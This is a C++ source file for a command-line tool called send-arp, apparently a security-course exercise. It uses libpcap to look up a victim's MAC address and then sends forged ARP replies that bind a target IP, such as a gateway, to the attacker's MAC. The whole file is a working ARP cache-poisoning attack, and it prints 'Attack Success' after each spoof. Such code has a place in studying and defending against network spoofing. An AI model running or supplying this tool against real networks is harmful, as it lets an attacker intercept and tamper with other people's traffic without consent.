#include <iostream>
#include <fstream>

#include <cstdio>
#include <cstring>

#include <sys/socket.h>
#include <sys/ioctl.h>

#include <arpa/inet.h>
#include <net/if.h>

#include <pcap.h>

#include "mac.h"
#include "ip.h"
#include "ethhdr.h"
#include "arphdr.h"

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1");
}

void attacker_mac(string interface, Mac& attackerMac) {
	ifstream fp ("/sys/class/net/" + interface + "/address");
	string macaddr;
	fp >> macaddr;
	fp.close();
	attackerMac = macaddr;

}

void attacker_ip(string interface, Ip& attackerIp ) {

	int s = socket(AF_INET, SOCK_DGRAM, 0);
	ifreq ifr;
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ -1);

	ioctl(s, SIOCGIFADDR, &ifr);

	string ipaddr = inet_ntoa(((sockaddr_in *) &ifr.ifr_addr) -> sin_addr);
	attackerIp = Ip(ipaddr);

}

void send_arp(pcap_t* handle, Mac& eth_dmac, Mac& eth_smac, Mac& arp_smac, Ip& arp_sip, Mac& arp_tmac, Ip& arp_tip, bool isRequest ){

	EthArpPacket packet;

	packet.eth_.dmac_ = eth_dmac;
	packet.eth_.smac_ = eth_smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = isRequest ? htons(ArpHdr::Request) : htons(ArpHdr::Reply);
	packet.arp_.smac_ = arp_smac;
	packet.arp_.sip_ = htonl(arp_sip);
	packet.arp_.tmac_ = arp_tmac;
	packet.arp_.tip_ = htonl(arp_tip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

void sender_mac(pcap_t* handle, Mac& senderMac, Ip& senderIp, Mac& attackerMac, Ip& attackerIp) {
    Mac broadcastMac = Mac("FF:FF:FF:FF:FF:FF");
    Mac nullMac = Mac("00:00:00:00:00:00");
    
    send_arp(handle, broadcastMac, senderMac, attackerMac, attackerIp, nullMac, senderIp, true );

    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        
        if (res == 0) continue;

        EthArpPacket* ethArpPacket = (EthArpPacket*)packet;
        if(ethArpPacket->eth_.type() == EthHdr::Arp && ethArpPacket->arp_.op() == ArpHdr::Reply && ethArpPacket->arp_.sip() == senderIp && ethArpPacket->arp_.tip() == attackerIp){
            senderMac = ethArpPacket->arp_.smac();
            break;
        }
    }
}

int main(int argc, char* argv[]) {
	int len = argc/2;
	if (argc < 4 || argc %2  != 0 ) {
		usage();
		return 0;
	}

	Mac attackerMac, senderMac;
	Ip attackerIp, senderIp, targetIp;

	string interface = argv[1];

	attacker_mac(interface, attackerMac);
	attacker_ip(interface, attackerIp);
	cout << "----------------------" << "\n";
	cout << "<Attacker>" << "\n";
	cout << "MAC : " << string(attackerMac) << "\n";
	cout << "IP : " << string(attackerIp) << "\n\n";
	
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	
	if (handle == nullptr) {
		fprintf(stderr, "can't open %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	for(int i=1; i< len ; i++) {
		senderIp = Ip(argv[i*2]);
		cout <<"Sender IP : " << argv[i*2] << "\n";
		targetIp = Ip(argv[i*2 +1]);
		cout << "Target IP : " << argv[i*2+1] << "\n";

		sender_mac(handle, senderMac, senderIp, attackerMac, attackerIp);
		cout << "Sender MAC : " << string(senderMac) << "\n";
		
		send_arp(handle, senderMac, attackerMac, attackerMac, targetIp, senderMac, senderIp, false );
		cout << "\nAttack Success" << "\n";
		cout << "----------------------" << "\n";
		

	}
	pcap_close(handle);
}
